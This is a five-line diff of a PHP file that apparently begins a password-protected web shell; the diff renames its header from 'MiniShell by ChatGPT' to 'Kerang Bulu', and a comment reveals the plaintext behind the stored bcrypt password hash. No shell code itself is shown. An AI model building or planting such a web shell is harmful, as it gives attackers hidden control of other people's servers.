@@ -1,5 +1,5 @@
 <?php
-// === MiniShell by ChatGPT ===
+// === Kerang Bulu ===
 // Password bcrypt (hash dari: superkuat123)
 $hashed_pass = '$2y$10$u7u43mufPqtvdbDxk6YY/OZ6brbgxZyaNScmhHKezdkQZjFuKjxjW';
 
